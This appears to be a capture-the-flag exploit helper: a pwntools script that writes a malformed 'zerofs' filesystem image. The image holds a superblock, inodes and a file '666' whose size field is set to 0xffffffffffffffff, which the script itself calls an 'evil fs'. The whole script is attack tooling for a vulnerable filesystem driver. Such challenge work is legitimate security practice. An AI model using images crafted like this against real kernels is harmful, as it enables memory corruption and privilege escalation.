# -*- coding: utf-8 -*-

#########################################################################
# File Name: makefs.py
# Created on : 2019-11-02 04:50:00
# Author: raycp
# Last Modified: 2019-11-04 04:02:22
# Description: build a evil fs, with filesize 0xffffffffffffffff.
#########################################################################
from pwn import *

## super block 
## magic: 0x4F52455A; blocksize: 0x1000; inode count: 0x3; 
block0 = p64(0x4F52455A) + p64(0x1000) + p64(3) + p64(0xffffffff ^ 0x7)
block0 = block0.ljust(0x1000, '\x00')

## there are two inode in second datablock, 1st inode is root inode, which data is stored in 2 nd datablock. 2nd inode's data is stored in 3rd datablock and its filesize is 0xffffffffffffffff
block1 = ''
inode1 = p64(1) + p64(2) + p64(0x4000) + p64(0x1)
inode2 = p64(2) + p64(3) + p64(0x8000) + p64(0xffffffffffffffff)
block1 += inode1 + inode2
block1 = block1.ljust(0x1000, '\x00')

## the 2nd blockdata is stored the dentry, there is only one file named 666 and its data inode is 2nd inode.
block2 = ''
block2 += '666'.ljust(256, '\x00')
block2 += p64(2)
block2 = block2.ljust(0x1000, '\x00')

img = block0 + block1 + block2 + '\x30' * 0x1000 * 1

with open('./cpio/tmp/zerofs.img', 'wb') as f:
    f.write(img)


